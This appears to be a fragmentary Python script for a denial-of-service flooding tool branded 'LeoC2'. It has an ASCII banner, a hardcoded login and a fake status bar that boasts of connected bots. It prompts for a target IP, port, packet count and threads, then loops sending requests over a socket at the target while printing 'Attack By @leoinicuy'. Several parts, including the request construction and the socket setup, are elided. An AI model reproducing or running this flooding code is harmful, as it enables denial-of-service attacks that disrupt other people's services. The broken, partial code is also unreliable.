...
████ ████ █ █          █  █
█████████               ██""")
username = str(input("[LeoC2] Username:"))
password = str(input("[LeoC2] Password:"))
if password == "tam" and username == "tam":
...
sys.stdout.write("\x1b]2;[-] LeoC2 | Online User : [{}] | Running Attack [5] | Bot Connected [89] | Admin : [Leo] | Username : Leo\x07".format (prot))
os.system("clear")
print("\033[93m")
...
>>> Leo Is Here <<<
""")
ip = str(input("\033[95m[\033[97mIP\033[95m]\033[37m\033[92m | \033[95m[\033[97madmin@Leo\033[95m]\033[37m >> \033[92m"))
ip = socket.gethostbyname(ip)
port = int(input("\033[95m[\033[97mPORT\033[95m]\033[37m\033[92m | \033[95m[\033[97madmin@Leo\033[95m]\033[37m >> \033[92m"))
choice = str(input("\033[95m[\033[97mDDOS?? (y/n)\033[95m]\033[37m\033[92m | \033[95m[\033[97madmin@Leo\033[95m]\033[37m >> \033[92m"))
times = int(input("\033[95m[\033[97mPACKET (1000)\033[95m]\033[37m\033[92m | \033[95m[\033[97madmin@Leo\033[95m]\033[37m >> \033[92m"))
threads = int(input("\033[95m[\033[97mTHREADS (5000)\033[95m]\033[37m\033[92m | \033[95m[\033[97madmin@Leo\033[95m]\033[37m >> \033[92m"))
os.system("clear")
    ...
    while True:
        try:
            ...
            for x in range(times):
                ...
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
            print(f"Attack By @leoinicuy To => {ip} With Port => {port}")
        except :
            print(f"Attack By @leoinicuy To => {ip} With Port => {port}")
            s.close()
